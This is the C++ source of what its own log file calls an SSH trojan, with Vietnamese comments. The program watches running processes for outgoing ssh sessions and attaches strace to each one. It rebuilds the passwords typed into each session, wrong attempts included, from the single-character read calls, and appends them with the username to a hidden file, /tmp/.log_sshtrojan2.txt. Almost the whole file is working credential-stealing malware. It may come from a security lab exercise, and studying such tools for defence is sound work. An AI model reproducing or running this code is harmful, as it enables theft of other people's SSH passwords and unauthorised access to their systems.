#include <bits/stdc++.h>
#include <stdio.h>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <thread>
#include <unistd.h>
#include <time.h>
#include <errno.h>
using namespace std;

set<int> check_pid; // kiểm tra xem một process đã được strace hay chưa?
// lấy ra thời gian hiện tại
const std::string currentDateTime(){
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    tstruct = *localtime(&now);
    strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);

    return buf;
}
/* sleep theo milisecond */
int msleep(long msec){
    struct timespec ts;
    int res;

    if (msec < 0){
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do{
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}

// lấy toàn bộ output khi thực hiện gọi một system call
vector<string> exec(const char *cmd){
    vector<string> ans;
    std::array<char, 1024> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe){
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr){
        string tmp = buffer.data();
        if (tmp[tmp.length() - 1] == '\n'){
            tmp = tmp.substr(0, tmp.length() - 1);
        }
        ans.push_back(tmp);
    }
    return ans;
}

// tách string theo tham số 'par'
vector<string> split(string target, char par){
    string current = "";
    vector<string> ans;
    for (int i = 0; i < target.size(); i++){
        if (target[i] != par){
            current += target[i];
        }
        else{
            if (current != ""){
                ans.push_back(current);
            }
            current = "";
        }
    }
    if (current != ""){
        ans.push_back(current);
    }
    return ans;
}

// kiểm tra một process đang chạy hay đã kết thúc
int check(int pid){
    string tmp = "ps auwx";
    const char *cmd = tmp.c_str();
    vector<string> res = exec(cmd);
    for (int i = 0; i < res.size(); i++){
        vector<string> temp = split(res[i], ' ');
        if (atoi(temp[1].c_str()) == pid)
            return 1;
    }

    return 0;
}

// xử lý việc ghi log của một process
void outgoing_ssh_log(int pid, string username){
    string datetime = currentDateTime();
    string dir = "/tmp/" + datetime + ".txt";     // file tạm thời để chứa output của lệnh strace
    string tmp = "strace -p " + to_string(pid) + " -e read -o " + dir; // chỉ lấy những lệnh read
    const char *cmd = tmp.c_str();
    FILE *fp;
    fp = popen(cmd, "r"); // thực hiện strace
    while (check(pid)){    
    // kiểm tra cho đến khi strace process đã xong
        sleep(1);
        continue;
    }
    pclose(fp);
    check_pid.erase(pid); // xoá process id khi đã strace xong
    cout << "Finished execute strace pid:" << pid << endl;
    ifstream in(dir); //đọc output của lệnh strace vừa rồi
    string curr = "";
    vector<string> log; // chứa các password đã nhập bao gồm cả password sai
    string passwd = "";
    // mẫu 1 dòng của ouput strace: read(4, "k", 1)                         = 1
    while (getline(in, curr)){ //đọc từng dòng
        if (curr.substr(0, 6) != "read(4")
            continue;
        if (curr.substr(curr.length() - 3, 3) != "= 1")
            continue;
        int flag = 0;
        string check_len = "";
        for (int i = 0; i < curr.length(); i++){
            if (curr[i] == ')')
                break;
            if (curr[i] == ' ')
                continue;
            if (curr[i] == ',')
                flag++;
            if (flag == 2){
                if (isdigit(curr[i]))
                {
                    check_len += curr[i];
                }
            }
        }
        // check_len là tham số thứ 3 trong lệnh read
        // vd:  read(4, "k", 1)                         = 1   ==> check_len=1
        if (atoi(check_len.c_str()) == 1){
            for (int i = 0; i < curr.length(); i++){
                if (curr[i] == '"'){
                    if (curr.substr(i + 1, 2) == "\\n"){
                        if (passwd != "yes"){
                            log.push_back(passwd);
                        }
                        passwd = "";
                        break;
                    }
                    passwd += curr[i + 1];
                    break;
                }
            }
        }
    }
    in.close();
    if (log.size() == 0){
        cout << "Done process " << pid << endl;
        return;
    }
    ofstream out("/tmp/.log_sshtrojan2.txt", std::ios_base::app | std::ios_base::out); // ghi đè log vào cuối file mà không xoá dữ liệu cũ
    cout << datetime << endl;
    out << datetime << endl;
    cout << "Log:" << endl;
    cout << "Username: " << username << endl;
    out << "Username: " << username << endl;
    cout << "Tried paswwords:" << endl;
    out << "Tried paswwords:" << endl;
    for (string i : log){
        cout << i << endl;
        out << i << endl;
    }
    out << endl;
    out.close();
    string removefile = "rm -rf " + dir;
    system(removefile.c_str()); // xoá file tạm chứa output của strace
    cout << "Done process " << pid << endl;
    cout << endl;
}

int main(){
    while (true){
        string tmp = "ps auwx";
        const char *cmd = tmp.c_str();
        vector<string> list_process = exec(cmd); // lấy toàn bộ danh sách các process đang chạy
        for (string i : list_process){
            vector<string> info_process = split(i, ' ');
            if (info_process[10] == "ssh"){                     
            // kiểm tra xem có phải lệnh ssh hay không
                string username = "";
                int flag = 0;
                // tách username trước '@'
                for (int j = 0; j < info_process[11].length(); j++){
                    if (info_process[11][j] == '@'){
                        flag = 1;
                        break;
                    }
                    username += info_process[11][j];
                }
                if (flag == 0){
                    username = info_process[0]; // nếu không có @ thì username chính là username của user hiện tại
                }
                if (check_pid.find(atoi(info_process[1].c_str())) == check_pid.end()){ 
                // kiểm tra xem process đã được strace hay chưa?   
                    check_pid.insert(atoi(info_process[1].c_str()));
                    thread new_process(outgoing_ssh_log, atoi(info_process[1].c_str()), username);
                    new_process.detach();
                }
            }
        }
        msleep(500);
    }
    return 0;
}
